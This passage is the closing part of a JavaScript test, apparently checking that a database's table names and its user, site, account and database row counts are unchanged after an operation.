    expect(tableNames(env)).toEqual(tablesAtStart);
    const now = counts(env);
    expect(now.users).toBe(countsAtStart.users);
    expect(now.sites).toBe(countsAtStart.sites);
    expect(now.accounts).toBe(countsAtStart.accounts);
    expect(now.databases).toBe(countsAtStart.databases);
  });
});
